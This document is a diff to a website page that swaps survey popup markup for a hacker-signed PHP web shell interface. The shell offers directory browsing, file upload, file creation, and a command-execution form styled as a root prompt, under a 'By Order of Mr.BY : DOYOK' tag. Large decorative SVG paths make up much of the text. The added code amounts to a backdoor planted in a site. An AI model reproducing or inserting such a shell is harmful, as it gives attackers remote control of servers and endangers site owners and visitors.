+       <path d="M334 230v2h1l1 1h1l1 1-1-1h-1l-2-2 1-1h1l1 1h1l2 2h1l2 2h2l2 2h1l1 1h2l1 1h1l1 1h2l1 1h2l1 1h4l1 1h7l1-1h3l1-1h1l1 1-2 2h-1l-1 1h-11 11l1-1h2l1-1v-1l1-1h-3l-1 1h-3l-1 1h-7l-1-1h-4l-1-1h-2l-1-1h-1l-1-1h-2l-1-1h-1l-1-1h-1l-1-1h-1l-1-1h-1l-2-2h-1l-2-2h-1l-1-1Zm-29 0-1 1h-1l-2 2h-1l-2 2h-1l-1 1h-1l-1 1h-1l-1 1h-1l-1 1h-1l-1 1h-2l-1 1h-2l-1 1h-3l-1 1h-9l-1-1h-2l-1-1h-2v1l-1 1h1l1 1h1l1 1h9-9l-1-1h-1l-1-1v-1l1-1h1l1 1h2l1 1h9l1-1h3l1-1h2l1-1h2l1-1h2l1-1h1l1-1h1l1-1h1l1-1h1l3-3h1l1-1h1l1-1h1l1 1-2 2h-1l-1 1 1-1h1l1-1h1v-2Zm11-14-1 1h-1l-1 1v1h4l1-1h6l1 1h3v-2h-1l-1-1Zm6-6-1 1h-6l-1 1h-1v2h2l1-1h8l1 1h2v-1l1-1h-1l-1-1h-3Zm-7-4-2 2v2-2l1-1h1l1-1h9l1 1h1l1 1-1 1h-2l-1-1h-6l-1 1h-2 2l1-1h6l1 1h3v-2h-2l-1-1Zm2-6-1 1h-2l-1 1v2h2l1-1h3l1-1h1l1 1h4l1 1v-3h-2l-1-1Zm32-6-1 1h-3l-1 1h-2l-1 1h-2l-1 1h-1l-2 2h-1l-2 2v1l-1 1h3l2-2h1l2-2h2l1-1h1l1-1h2l1-1h15l1 1h2l1 1h1l1 1h2l3 3h1l5 5v1l2 2v1l1 1v1l1 1v1l1 1v1l1 1v3l1 1v4l1 1v5h1l1 1v-9l-1-1v-4l-1-1v-2l-1-1v-2l-1-1v-1l-1-1v-1l-2-2v-1l-7-7h-1l-2-2h-1l-1-1h-2l-1-1h-2l-1-1h-4l-1-1Zm-66 0-1 1h-4l-1 1h-2l-1 1h-2l-1 1h-1l-1 1h-1l-3 3h-1l-1 1v1l-3 3v1l-2 2v1l-1 1v1l-1 1v2l-1 1v2l-1 1v3l-1 1v7l-1 1 1 1h2v-4l1-1v-6l1-1v-2l1-1v-2l1-1v-1l1-1v-1l2-2v-1l6-6h1l2-2h1l2-2h2l1-1h2l1-1h15l1 1h2l1 1h1l1 1h1l1 1h1l3 3h3v-2l-2-2h-1l-2-2h-1l-1-1h-2l-1-1h-2l-1-1h-3l-1-1Z" fill="none" stroke="#0ff" stroke-width="2"/>
+       <path d="m279 185-1 1h-4l-1 1h-3l-1 1h-3l-2 2h-2l-1 1h-1l-1 1h-1l-1 1h-1l-3 3h-1l-3 3h-1l-8 8v1l-4 4v1l-3 3v1l-3 3v1l-1 1v1l-2 2v1l-1 1v1l-1 1v1l-2 2v1l-1 1v1l-1 1v1l-1 1v2l-2 2v2l-1 1v1l-1 1v2l-2 2v2l-1 1v2l-1 1v2l-1 1v1l-1 1v2l-1 1v2l-1 1v2l-1 1v2l-1 1v2l-1 1v2l-1 1v3l-1 1v3l-1 1v2l-1 1v3l-1 1v4l-1 1v3l-2 2v1l-4 4v1l-2 2v1l-1 1 1-1v-1l5-5v-1l2-2v-1l1-1v-3l1-1v-4l1-1v-3l1-1v-2l1-1v-3l1-1v-3l1-1v-2l1-1v-2l1-1v-2l1-1v-2l1-1v-2l1-1v-2l1-1v-1l1-1v-2l1-1v-2l1-1v-1l1-1v-1l1-1v-2l1-1v-1l1-1v-1l1-1v-1l1-1v-1l1-1v-2l2-2v-1l1-1v-1l2-2v-1l1-1v-1l1-1v-1l2-2v-1l2-2v-1l3-3v-1l3-3v-1l12-12h1l3-3h1l2-2h1l1-1h1l1-1h1l1-1h1l1-1h1l1-1h2l1-1h3l1-1h4l1-1h12l1 1h4l1 1h3l1 1h2l1 1h2l1 1h2l1 1h2l1 1h5l1 1h4l1-1h5l1-1h2l1-1h2l1-1h2l1-1h2l1-1h3l1-1h4l1-1h12l1 1h4l1 1h3l1 1h2l1 1h1l1 1h1l1 1h1l1 1h1l2 2h1l2 2h1l2 2h1l11 11v1l3 3v1l3 3v1l2 2v1l2 2v1l2 2v1l1 1v1l1 1v1l2 2v1l1 1v1l1 1v1l1 1v1l1 1v2l2 2v2l1 1v1l1 1v2l1 1v1l1 1v1l1 1v2l1 1v2l1 1v1l1 1v3l1 1v1l1 1v2l1 1v3l1 1v2l1 1v3l1 1v2l1 1v3l1 1v3l1 1v3l1 1v4l3 3v1l5 5v1l1 1-1-1v-1l-2-2v-1l-5-5v-1l-1-1v-3l-1-1v-3l-1-1v-3l-1-1v-3l-1-1v-2l-1-1v-3l-1-1v-2l-1-1v-3l-1-1v-2l-1-1v-1l-1-1v-3l-1-1v-1l-1-1v-2l-1-1v-2l-1-1v-1l-1-1v-2l-1-1v-1l-1-1v-1l-1-1v-2l-1-1v-1l-1-1v-1l-1-1v-2l-1-1v-1l-2-2v-1l-1-1v-1l-1-1v-1l-1-1v-1l-2-2v-1l-1-1v-1l-2-2v-1l-2-2v-1l-3-3v-1l-6-6v-1l-4-4h-1l-5-5h-1l-2-2h-1l-2-2h-1l-1-1h-1l-1-1h-1l-1-1h-1l-1-1h-3l-1-1h-3l-1-1h-4l-1-1h-12l-1 1h-4l-1 1h-3l-1 1h-2l-1 1h-2l-1 1h-2l-1 1h-2l-1 1h-5l-1 1h-4l-1-1h-5l-1-1h-2l-1-1h-1l-1-1h-3l-1-1h-2l-1-1h-3l-1-1h-4l-1-1Z" fill="none" stroke="#0ff" stroke-width="2"/>
+       <path d="m315 106-1 1h-1l-1 1h-1l-1 1h-10l-1 1h-7l-1 1h-4l-1 1h-2l-1 1h-3l-1 1h-2l-1 1h-1l-1 1h-1l-1 1h-1l-1 1h-1l-1 1h-1l-1 1h-1l-2 2h-1l-5 5h-1l-5 5v1l-4 4v1l-2 2v1l-2 2v1l-1 1v1l-1 1v1l-1 1v1l-1 1v1l-1 1v1l-1 1v2l-1 1v2l-1 1v2l-1 1v2l-1 1v3l-1 1v3l-1 1v5l-1 1v7l-1 1v11l-1 1v2l-1 1v2l-1 1v1l-1 1v2l-1 1v3l-1 1v1l-1 1v2l-1 1v2l-1 1v1l-1 1v3l-1 1v2l-1 1v1l-1 1v2l-1 1v2l-1 1v2l-1 1v2l-1 1v2l-1 1v1l-1 1v2l-1 1v2l-1 1v2l-1 1v1l-1 1v3l-1 1v1l-1 1v2l-1 1v2l-1 1v2l-1 1v2l-1 1v2l-1 1v1l-1 1v2l-1 1v2l-1 1v2l-1 1v2l-1 1v2l-1 1v1l-1 1v2l-1 1v2l-1 1v1l-1 1v2l-1 1v1-1l1-1v-2l1-1v-1l1-1v-2l1-1v-1l1-1v-2l1-1v-2l1-1v-2l1-1v-2l1-1v-2l1-1v-2l1-1v-1l1-1v-2l1-1v-2l1-1v-2l1-1v-1l1-1v-3l1-1v-1l1-1v-3l1-1v-1l1-1v-2l1-1v-2l1-1v-2l1-1v-1l1-1v-2l1-1v-2l1-1v-2l1-1v-2l1-1v-2l1-1v-1l1-1v-2l1-1v-3l1-1v-1l1-1v-2l1-1v-2l1-1v-1l1-1v-3l1-1v-1l1-1v-2l1-1v-2l1-1v-2l1-1v-11l1-1v-7l1-1v-5l1-1v-3l1-1v-3l1-1v-2l1-1v-2l1-1v-1l1-1v-3l2-2v-2l1-1v-1l1-1v-1l2-2v-1l1-1v-1l2-2v-1l3-3v-1l10-10h1l3-3h1l2-2h1l1-1h1l2-2h2l2-2h2l1-1h1l1-1h3l1-1h2l1-1h4l1-1h7l1-1h11l2-2h1l1-1h11l3 3h12l1 1h7l1 1h4l1 1h3l1 1h2l1 1h2l1 1h2l1 1h1l1 1h1l1 1h1l1 1h1l2 2h1l2 2h1l3 3h1l10 10v1l3 3v1l2 2v1l2 2v1l1 1v1l1 1v1l1 1v1l1 1v2l1 1v1l1 1v1l1 1v3l1 1v3l1 1v3l1 1v4l1 1v5l1 1v13l1 1v3l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v1l1 1v3l1 1v1l1 1v2l1 1v3l1 1v2l1 1v1l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v1l1 1v2l1 1v1-1l-1-1v-2l-1-1v-1l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-1l-1-1v-2l-1-1v-3l-1-1v-2l-1-1v-1l-1-1v-3l-1-1v-1l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-3l-1-1v-13l-1-1v-5l-1-1v-4l-1-1v-3l-1-1v-3l-1-1v-3l-1-1v-2l-1-1v-1l-1-1v-1l-1-1v-2l-1-1v-1l-1-1v-1l-2-2v-1l-1-1v-1l-2-2v-1l-5-5v-1l-6-6h-1l-3-3h-1l-2-2h-1l-2-2h-1l-1-1h-1l-2-2h-2l-1-1h-1l-1-1h-2l-1-1h-2l-1-1h-2l-1-1h-3l-1-1h-4l-1-1h-7l-1-1h-11l-2-2h-1l-1-1Z" fill="none" stroke="#0ff" stroke-width="2"/>
+       <path d="m313 104-1 1h-1l-2 2h-13l-1 1h-5l-1 1h-4l-1 1h-2l-1 1h-2l-1 1h-2l-1 1h-2l-1 1h-1l-1 1h-1l-1 1h-1l-1 1h-1l-2 2h-1l-3 3h-1l-4 4h-1v1l-7 7v1l-3 3v1l-2 2v1l-1 1v1l-1 1v1l-1 1v1l-1 1v1l-1 1v1l-1 1v2l-1 1v2l-1 1v2l-1 1v2l-1 1v2l-1 1v4l-1 1v3l-1 1v7l-1 1v14l-1 1v2l-1 1v1l-1 1v2l-1 1v2l-1 1v2l-1 1v2l-1 1v1l-1 1v2l-1 1v2l-1 1v2l-1 1v1l-1 1v3l-1 1v1l-1 1v2l-1 1v2l-1 1v2l-1 1v1l-1 1v2l-1 1v2l-1 1v2l-1 1v2l-1 1v2l-1 1v2l-1 1v2l-1 1v1l-1 1v2l-1 1v2l-1 1v1l-1 1v2l-1 1v2l-1 1v2l-1 1v2l-1 1v2l-1 1v2l-1 1v2l-1 1v1l-1 1v2l-1 1v2l-1 1v2l-1 1v2l-1 1v1l-1 1v3l-1 1v2l-1 1v1l-1 1v2l-1 1v2l-1 1v2l-1 1v2l-1 1v1l-1 1v2l-1 1v3l-1 1v15l1 1v1l1 1v3l1 1v1l2 2v1l8 8h1l1 1v1l-1 1h-3l-1 1h-2l-1 1h-2l-1 1h-3l-1 1h-2l-1 1h-3l-1 1h-2l-1 1h-2l-1 1h-3l-1 1h-2l-1 1h-2l-1 1h-2l-1 1h-2l-1 1h-1l-1 1h-2l-2 2h-1l-2 2h-1l-2 2h-1l-2 2h-1l-2 2h-1l-2 2h-1l-2 2h-1l-1 1h-1l-2 2h-1l-2 2h-1l-5 5-1-1h-1l-1-1h-5l-1 1h-2l-1 1h-1l-1 1h-1l-1 1h-1l-1 1h-1l-1 1h-1l-1 1h-1l-7 7v1l-2 2v1l-1 1v1l-1 1v1l-1 1v1l-1 1v1l-1 1v1l-2 2v1l-1 1v1l-1 1v1l-1 1v1l-1 1v1l-2 2v1l-1 1v1l-1 1v1l-1 1v1l-2 2v1l-1 1v1l-1 1v1l-2 2v2l-2 2v1l-1 1v1l-8 8v1l-5 5v1l-1 1h-1v1l-5 5v1l-7 7v1L4 533H3l-2 2H0h1l1-1h1l2-2h1l16-16v-1l8-8v-1l6-6v-1l7-7 1 1h1-1l-1-1v-1l8-8v-1l1-1v-1l1-1v-1l1-1v-1l2-2v-1l1-1v-1l1-1v-1l2-2v-1l1-1v-1l1-1v-1l1-1v-1l1-1v-1l2-2v-1l1-1v-1l1-1v-1l1-1v-1l1-1v-1l2-2v-1l1-1v-1l1-1v-1l1-1v-1l1-1v-1l2-2v-1l8-8h1l1-1h1l1-1h1l1-1h1l2-2h1l1-1h2l1-1h5l1 1h1l1 1 1-1h1l4-4h1l2-2h1l2-2h1l1-1h1l2-2h1l2-2h1l2-2h1l2-2h1l2-2h1l2-2h1l2-2h1l1-1h1l1-1h2l1-1h2l1-1h2l1-1h2l1-1h3l1-1h2l1-1h2l1-1h3l1-1h2l1-1h3l1-1h2l1-1h2l1-1h3l1-1v-2h-1l-3-3h-1l-2-2v-1l-4-4v-1l-1-1v-1l-1-1v-2l-1-1v-1l-1-1v-15l1-1v-3l1-1v-2l1-1v-1l1-1v-2l1-1v-2l1-1v-2l1-1v-2l1-1v-1l1-1v-2l1-1v-3l1-1v-1l1-1v-2l1-1v-2l1-1v-2l1-1v-2l1-1v-1l1-1v-2l1-1v-2l1-1v-2l1-1v-2l1-1v-2l1-1v-2l1-1v-1l1-1v-2l1-1v-2l1-1v-2l1-1v-1l1-1v-2l1-1v-2l1-1v-2l1-1v-2l1-1v-2l1-1v-2l1-1v-2l1-1v-1l1-1v-2l1-1v-2l1-1v-2l1-1v-1l1-1v-3l1-1v-1l1-1v-2l1-1v-2l1-1v-2l1-1v-1l1-1v-2l1-1v-2l1-1v-2l1-1v-2l1-1v-1l1-1v-2l1-1v-14l1-1v-7l1-1v-3l1-1v-4l1-1v-2l1-1v-2l1-1v-2l1-1v-2l1-1v-2l1-1v-1l1-1v-1l2-2v-1l1-1v-1l1-1v-1l2-2v-1l2-2v-1l4-4v-1l6-6h1l5-5h1l2-2h1l1-1h1l1-1h1l2-2h2l1-1h1l1-1h2l1-1h2l1-1h2l1-1h4l1-1h5l1-1h13l1-1h1l2-2h15l3 3h14l1 1h6l1 1h3l1 1h3l1 1h2l1 1h1l1 1h2l1 1h1l1 1h2l2 2h1l1 1h1l1 1h1l3 3h1l3 3h1l7 7v1l5 5v1l2 2v1l1 1v1l2 2v1l1 1v1l1 1v2l1 1v1l1 1v1l1 1v2l1 1v2l1 1v2l1 1v3l1 1v3l1 1v6l1 1v6l1 1v11l1 1v2l1 1v3l1 1v1l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v1l1 1v3l1 1v2l1 1v2l1 1v2l1 1v1l1 1v3l1 1v2l1 1v1l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v2l1 1v3l1 1v1l1 1v2l1 1v2l1 1v1l1 1v1l1 1v2l1 1v3l1 1v4l1 1v8l-1 1v3l-1 1v2l-1 1v1l-1 1v1l-1 1v1l-10 10-1-1v-1l9-9v-1l1-1v-1l1-1v-1l1-1v-3l1-1v-13l-1-1v-3l-1-1v-1l-1-1v-2l-1-1v-1l-1-1v-2l-1-1v-1l-1-1v-1l-1-1v-1l-1-1v-1l-3-3v-1l-3-3v-1l-5-5v-1l-3-3v-2l-1-1v-3l-1-1v-4l-1-1v-3l-1-1v-3l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-3l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-1l-1-1v-2l-1-1v-2l-1-1v-1l-1-1v-2l-1-1v-1l-1-1v-1l-1-1v-1l-1-1v-1l-1-1v-2l-1-1v-1l-1-1v-1l-1-1v-1l-2-2v-1l-1-1v-1l-1-1v-1l-2-2v-1l-2-2v-1l-2-2v-1l-3-3v-1l-3-3v-1l-10-10h-1l-2-2h-1l-2-2h-1l-2-2h-1l-1-1h-1l-1-1h-1l-1-1h-2l-1-1h-2l-1-1h-3l-1-1h-18l-1 1h-3l-1 1h-3l-1 1h-2l-1 1h-1l-1 1h-2l-1 1h-4l-1 1h-11l-1-1h-4l-1-1h-1l-1-1h-2l-1-1h-2l-1-1h-2l-1-1h-4l-1-1h-17l-1 1h-3l-1 1h-3l-1 1h-1l-1 1h-1l-1 1h-1l-1 1h-1l-1 1h-1l-2 2h-1l-3 3h-1l-11 11v1l-3 3v1l-3 3v1l-2 2v1l-2 2v1l-1 1v1l-1 1v1l-2 2v1l-1 1v1l-1 1v1l-1 1v1l-1 1v1l-1 1v1l-1 1v1l-1 1v1l-1 1v2l-1 1v1l-1 1v2l-1 1v2l-1 1v1l-1 1v1l-1 1v3l-1 1v1l-1 1v3l-1 1v2l-1 1v2l-1 1v2l-1 1v3l-1 1v3l-1 1v3l-1 1v3l-1 1v4l-1 1v1l-1 1v1l-2 2v1l-5 5v1l-3 3v1l-2 2v1l-2 2v1l-1 1v1l-1 1v1l-1 1v1l-1 1v1l-1 1v2l-1 1v2l-1 1v3l-1 1v4l-1 1v7l1 1v4l1 1v2l1 1v1l1 1v1l4 4v1l1 1h1l3 3h1l2 2h1l1 1 1-1h3l1-1h3l1-1h2l1-1h3l1-1h3l1-1h2l1 1-2 2h-2l-1 1h-3l-1 1h-3l-1 1h-2l-1 1h-2l-1 1h-4l-1 1h-2l-1 1h-2l-1 1h-3l-1 1h-2l-1 1h-3l-1 1h-3l-1 1h-2l-1 1h-2l-1 1h-2l-1 1h-2l-1 1h-3l-1 1h-2l-1 1h-2l-1 1h-2l-1 1h-2l-1 1h-1l-2 2h-1l-2 2h-1l-2 2h-1l-2 2h-1l-2 2h-1l-2 2h-1l-2 2h-1l-1 1h-1l-2 2h-1l-2 2h-1l-4 4h-1l-7 7h-1l-12 12h-1l-1-1 13-13h1l3-3v-2h-6l-1 1h-2l-2 2h-1l-1 1h-1l-1 1h-1l-1 1h-1l-7 7v1l-2 2v1l-1 1v1l-1 1v1l-1 1v1l-1 1v1l-2 2v1l-1 1v1l-1 1v1l-1 1v1l-1 1v1l-2 2v1l-1 1v1l-1 1v1l-1 1v1l-1 1v1l-2 2v1l-1 1v1l-1 1v1l-2 2v1l-1 1v1l-1 1v1l-1 1v1l-2 2v1l-2 2v1l-1 1v1l-1 1v1l-1 1v1l-1 1v1l-2 2v1l-1 1v1l-2 2v1l-2 2v1l-1 1v1l-1 1v1l-2 2v1l-2 2v1l-2 2v1l-2 2v1l-2 2v1l-6 6h-1l-1-1 6-6v-1l2-2v-1l2-2v-1l2-2v-1l2-2v-1l2-2v-1l1-1v-1l1-1v-1l2-2v-1l2-2v-1l1-1-1 1v1l-3 3v1l-1 1v1l-2 2v1l-2 2v1l-2 2v1l-2 2v1l-1 1v1l-3 3v1l-4 4v1l-1 1h-1v2h3l3-3v-1l3-3v-1l3-3v-1l1-1v-1l2-2v-1l2-2v-1l1-1v-1l2-2v-1l2-2v-1l1-1v-1l2-2v-1l2-2v-1l1-1v-1l1-1v-1l1-1v-1l1-1v-1l2-2v-1l1-1v-1l2-2v-1l1-1v-1l1-1v-1l1-1v-1l2-2v-1l1-1v-1l1-1v-1l2-2v-1l1-1v-1l1-1v-1l1-1v-1l2-2v-1l1-1v-1l1-1v-1l1-1v-1l1-1v-1l1-1v-1l1-1v-1l2-2v-1l1-1v-1l1-1v-1l1-1v-1l3-3v-1l3-3h1l2-2h1l1-1h1l1-1h1l1-1h1l2-2h1l1-1h5l1 1-5 5h-1v1l-1 1h-1l-9 9v1l1 1v1h1l16-16h1l5-5h1l4-4h1l2-2h1l1-1h1l2-2h1l2-2h1l2-2h1l1-1h1l3-3h1l2-2h1l1-1 2 2h26l1-1h7l1-1h5l1-1h4l1-1h4l1-1h3l1-1h3l1-1h3l1-1h2l1-1h2l1-1h2l1-1h2l1-1h2l1-1h1l1-1h2l1-1h1l1-1h2l1-1h1l1-1h1v-3h-2l-2 2h-2l-1 1h-1l-1 1h-1l-1 1h-2l-1 1h-1l-1 1h-2l-1 1h-2l-1 1h-2l-1 1h-2l-1 1h-3l-1 1h-2l-1 1h-3l-1 1h-4l-1 1h-4l-1 1h-4l-1 1h-6l-1 1h-15l-1 1h-8l-1-1h-2l-1 1 1-1h2l1 1h8l1-1h15l1-1h6l1-1h4l1-1h4l1-1h4l1-1h3l1-1h2l1-1h3l1-1h2l1-1h2l1-1h2l1-1h2l1-1h1l1-1h2l1-1h1l1-1h2l1-1h1l1-1h1l1-1 1 1v1l-1 1h-1l-1 1h-1l-1 1h-1l-1 1h-1l-1 1h-2l-1 1h-2l-1 1h-1l-1 1h-2l-1 1h-2l-1 1h-2l-1 1h-2l-1 1h-3l-1 1h-3l-1 1h-3l-1 1h-4l-1 1h-4l-1 1h-5l-1 1h-7l-1 1h-25l-1-1h-1l-1-1 2-2h1l1-1h2l1-1h2l1-1h2l1-1h2l1-1h3l1-1h2l1-1h2l1-1h2l1-1h2l1-1h3l1-1h3l1-1h2l1-1h3l1-1h2l1-1h2l1-1h4l1-1h2l1-1h2l1-1h3l1-1h3l1-1h3l1-1v-2h-3l-1 1h-3l-1 1h-3l-1 1h-2l-1 1h-3l-1 1h-3l-1 1-2-2h-1l-3-3h-1l-4-4v-1l-3-3v-1l-1-1v-1l-1-1v-1l-1-1v-4l-1-1v-7l1-1v-4l1-1v-3l1-1v-1l1-1v-2l1-1v-1l1-1v-1l1-1v-1l1-1v-1l1-1v-1l2-2v-1l2-2v-1l3-3v-1l3-3v-1l4-4v-1l1-1v-2l1-1v-4l1-1v-3l1-1v-3l1-1v-3l1-1v-3l1-1v-2l1-1v-2l1-1v-2l1-1v-2l1-1v-2l1-1v-2l1-1v-1l1-1v-2l1-1v-2l1-1v-2l1-1v-1l1-1v-1l1-1v-1l1-1v-1l1-1v-1l1-1v-1l1-1v-1l1-1v-1l1-1v-1l1-1v-1l1-1v-1l2-2v-1l1-1v-1l2-2v-1l2-2v-1l2-2v-1l3-3v-1l14-14h1l2-2h1l2-2h1l2-2h1l1-1h2l2-2h3l1-1h3l1-1h17l1 1h4l1 1h2l1 1h2l1 1h1l1 1h2l1 1h4l1 1h11l1-1h4l1-1h2l1-1h1l1-1h2l1-1h3l1-1h3l1-1h18l1 1h3l1 1h2l1 1h1l1 1h1l1 1h1l1 1h1l1 1h1l2 2h1l3 3h1l12 12v1l4 4v1l2 2v1l2 2v1l2 2v1l1 1v1l2 2v1l1 1v1l1 1v1l1 1v1l1 1v1l1 1v1l1 1v1l1 1v1l1 1v2l2 2v2l1 1v2l1 1v1l1 1v2l1 1v1l1 1v2l1 1v2l1 1v3l1 1v2l1 1v2l1 1v2l1 1v2l1 1v3l1 1v3l1 1v4l1 1v3l1 1v3l5 5v1l4 4v1l2 2v1l3 3v1l1 1v1l1 1v1l1 1v1l1 1v1l1 1v2l1 1v1l1 1v1l1 1v3l1 1v13l-1 1v3l-1 1v1l-2 2v1l-2 2v1l-4 4h-1l-4 4h-3l-1-1h-3l-1-1h-3l-1-1h-3l1 1-1 1h1l1 1h3l1 1h3l1 1h1l1 1h4l1 1h2l1 1h3l1 1h2l1 1h3l1 1h3l1 1h2l1 1h2l1 1h3l1 1h2l1 1h2l1 1h3l1 1h2l1 1h2l1 1h2l1 1h2l1 1h2l1 1h2-2l-1-1h-2l-1-1h-2l-1-1h-2l-1-1h-2l-1-1h-2l-1-1h-3l-1-1h-2l-1-1h-2l-1-1h-3l-1-1h-2l-1-1h-2l-1-1h-3l-1-1h-3l-1-1h-2l-1-1h-3l-1-1h-2l-1-1h-3l-1-1h-2l-1-1h-3l-1-1h-2l-2-2 1-1h1l1 1h3l1 1h3l1 1h3l1-1 3 3h2l1 1h3l1 1h2l1 1h3l1 1h2l1 1h3l1 1h3l1 1h2l1 1h2l1 1h2l1 1h3l1 1h2l1 1h2l1 1h2l1 1h2l1 1h2l1 1h2l2 2h1l2 2h1l2 2h1l2 2h1l2 2h1l2 2h1l1 1h1l2 2h1l2 2h1l2 2h1l3 3h1l2 2h1l1 1 1-1h1l1-1h4l1 1h2l1 1h1l1 1h1l1 1h1l2 2h2l3 3h1l4 4v1l2 2v1l2 2v1l1 1v1l1 1v1l1 1v1l1 1v1l1 1v1l2 2v1l1 1v1l1 1v1l1 1v1l2 2v1l1 1v1l1 1v1l1 1v1l1 1v1l2 2v1l1 1v1l1 1v1l2 2v1l1 1v1l1 1v1l3 3v1l7 7v1l8 8v1l8 8v1l12 12-3-3v-1h-1l-1-1v-1l-10-10v-1l-7-7v-1l-6-6v-1l-7-7v-1h-1l-1-1v-1l-1-1v-1l-2-2v-1l-1-1v-1l-1-1v-1l-2-2v-2l-2-2v-1l-1-1v-1l-1-1v-1l-1-1v-1l-2-2v-1l-1-1v-1l-1-1v-1l-2-2v-1l-1-1v-1l-1-1v-1l-1-1v-1l-1-1v-1l-1-1v-1l-1-1v-1l-2-2v-1l-1-1v-1l-3-3v-1l-2-2h-1l-2-2h-1l-1-1h-1l-1-1h-1l-2-2h-1l-1-1h-2l-1-1h-2l-1-1h-4l-1 1h-1l-1 1-2-2h-1l-4-4h-1l-2-2h-1l-2-2h-1l-1-1h-1l-2-2h-1l-2-2h-1l-1-1h-1l-2-2h-1l-3-3h-1l-2-2h-1l-1-1h-1l-1-1h-2l-1-1h-2l-1-1h-2l-1-1h-2l-1-1h-2l-1-1h-2l-1-1h-3l-1-1h-2l-1-1h-2l-1-1h-2l-1-1h-3l-1-1h-3l-1-1h-2l-1-1h-3l-1-1h-2l-1-1h-3l-1-1h-2l-1-1 2-2h1l6-6v-1l2-2v-1l1-1v-1l1-1v-3l1-1v-3l1-1v-8l-1-1v-4l-1-1v-3l-1-1v-2l-1-1v-1l-1-1v-2l-1-1v-1l-1-1v-2l-1-1v-1l-1-1v-3l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-1l-1-1v-2l-1-1v-3l-1-1v-1l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-3l-1-1v-1l-1-1v-2l-1-1v-2l-1-1v-3l-1-1v-1l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-1l-1-1v-3l-1-1v-2l-1-1v-11l-1-1v-6l-1-1v-6l-1-1v-3l-1-1v-3l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-2l-1-1v-1l-1-1v-1l-1-1v-1l-1-1v-1l-1-1v-1l-1-1v-1l-2-2v-1l-2-2v-1l-5-5v-1h-1l-7-7h-1l-3-3h-1l-1-1h-1l-2-2h-1l-1-1h-1l-1-1h-1l-1-1h-1l-1-1h-2l-1-1h-2l-1-1h-2l-1-1h-3l-1-1h-3l-1-1h-6l-1-1h-13l-2-2h-1l-1-1Z" fill="none" stroke="#0ff" stroke-width="2"/>
+    </svg>
+    </div>
+    <div class="container path">
+        <?php
+        $pathParts = explode(DIRECTORY_SEPARATOR, $currentDir);
+        $currentPath = "";
+        foreach ($pathParts as $index => $part) {
+            if ($part !== "") {
+                $currentPath .= ($index == 0 ? "" : DIRECTORY_SEPARATOR) . $part;
+                echo '<a href="?path=' . htmlspecialchars($currentPath) . '">' . htmlspecialchars($part) . '</a>/';
+            }
+        }
+        ?>
     </div>
 
+    <div class="container upload-section">
+        <form method="get">
+            <button type="submit" name="path" value="<?php echo htmlspecialchars($homeDir); ?>" class="upload-btn">Go to Home Directory</button>
+        </form>
 
-
-    <div data-site="themeforest" data-view="CsatSurvey" data-cookiebot-enabled="true" class="is-visually-hidden" bis_skin_checked="1">
-        <div id="js-customer-satisfaction-survey" bis_skin_checked="1">
-            <div class="e-modal" bis_skin_checked="1">
-                <div class="e-modal__section" id="js-customer-satisfaction-survey-iframe-wrapper" bis_skin_checked="1">
-                </div>
+        <form id="upload-form" method="post" enctype="multipart/form-data">
+        <div class="file-input-container">
+                <input type="file" name="file[]">
+                <button type="button" class="upload-btn" onclick="addUploadField()">+</button>
             </div>
-        </div>
-    </div>
-    <div id="js-customer-satisfaction-popup" class="survey-popup is-visually-hidden" bis_skin_checked="1">
-        <div class="h-text-align-right" bis_skin_checked="1"><a href="https://spanishlearningprogram.com/cultural/" id="js-popup-close-button" class="e-alert-box__dismiss-icon"><i class="e-icon -icon-cancel"></i></a>
-        </div>
-        <div class="survey-popup--section" bis_skin_checked="1">
-            <h2 class="t-heading h-text-align-center -size-m">Tell us what you think!</h2>
-            <p>We'd like to ask you a few questions to help improve ThemeForest.</p>
-        </div>
-        <div class="survey-popup--section" bis_skin_checked="1">
-            <a href="https://spanishlearningprogram.com/cultural/" id="js-show-survey-button" class="e-btn -color-primary -size-m -width-full js-survey-popup--show-survey-button">Sure, take me to
-                the survey</a>
-        </div>
+            <button type="submit" class="upload-btn" id="upload-button">Upload</button>
+        </form>
+
+        <form method="post">
+            <input type="text" name="newFileName" placeholder="Enter filename to create" required>
+            <button type="submit" name="createFile" class="upload-btn">Create File</button>
+        </form>
     </div>
 
+    <div class="container command-box">
+        <form method="post" style="display: flex; width: 100%; gap: 10px; justify-content: center; align-items: center;">
+            <label style="color: #0f0;">root@0UT1S:~$</label>
+            <input type="text" name="command" placeholder="Enter command..." required autofocus style="flex-grow: 1;">
+            <button type="submit" class="upload-btn">Execute</button>
+        </form>
+    </div>
 
+    <div class="container">
+        <h3>By Order of Mr.BY : DOYOK</h3>
+        <?php if (!empty($output)): ?>
+            <pre><?php echo htmlspecialchars($output); ?></pre>
+        <?php endif; ?>
+    </div>
 
